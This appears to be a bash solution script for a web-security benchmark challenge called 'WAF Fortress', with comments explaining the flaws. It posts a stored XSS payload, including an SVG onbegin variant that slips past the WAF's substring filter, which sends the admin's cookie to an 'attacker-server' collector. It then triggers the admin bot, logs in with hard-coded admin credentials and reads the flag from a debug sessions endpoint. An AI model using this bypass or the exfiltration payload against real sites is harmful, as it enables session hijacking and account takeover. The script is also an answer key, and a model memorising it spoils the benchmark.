#!/usr/bin/env bash
# APEX-050-25 — "WAF Fortress" (tags: waf_bypass, xss, session_hijacking)
#
# The WAF blocks a list of substrings — `<script`, `onerror=`, `document.cookie`,
# `fromCharCode` — and an SVG animation's `onbegin` is on none of them, nor is
# `self['document']['cookie']`, which is the same property spelled another way.
# So the same payload is refused in its plain form and accepted in its SVG one,
# and the first half of this script sends both to show the difference.
#
# The stolen cookie is where the benchmark stops being solvable as it describes
# itself. The admin's session id is exfiltrated to a collector on the internal
# network that nothing publishes, and even holding it would not help: this is
# `express-session`, whose cookie is `s:<id>.<HMAC>`, and the secret that signs
# it is in the compose file rather than anywhere the application reveals. The
# bot's own cookie ends in the literal word `signature`.
#
# What does open is the login: `admin@blog.local` / `admin_p4ss`, hard-coded in
# the application's source. Logging in puts the flag in the caller's own
# session, and `/api/admin/debug/sessions` prints every session there is.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex050-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

BLOCKED='<script>fetch("http://attacker-server:4000/exfil?c="+document.cookie)</script>'
PASSED='<svg><animate attributeName="x" values="0" onbegin="fetch('"'"'http://attacker-server:4000/exfil?c='"'"'+self['"'"'document'"'"']['"'"'cookie'"'"'])" dur="1s"/></svg>'

"$H5I" browser open "$URL/api/posts" --session "$SESSION" --new --capture >/dev/null

post() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/posts \
        --set header.Content-Type=application/json \
        --set "json.title=Important Update" --set "json.content=$1"
}

for payload in "$BLOCKED" "$PASSED"; do
    post "$payload" | python3 -c '
import re, sys
print("the WAF answered", re.search(r"\d{3}", sys.stdin.readline()).group(0),
      file=sys.stderr)
'
done

# The administrator reads it, and the payload runs on their page. What it steals
# goes somewhere this session cannot read; see the note above.
POST_ID="$(post "$PASSED" | body |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["post"]["id"])')"
send "$SESSION" req_0 --create --set path=/api/report \
    --set "query.post_id=$POST_ID" >/dev/null

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/login \
    --set header.Content-Type=application/json \
    --set json.email=admin@blog.local --set json.password=admin_p4ss >/dev/null
send "$SESSION" req_0 --create --set path=/api/admin/debug/sessions | flag
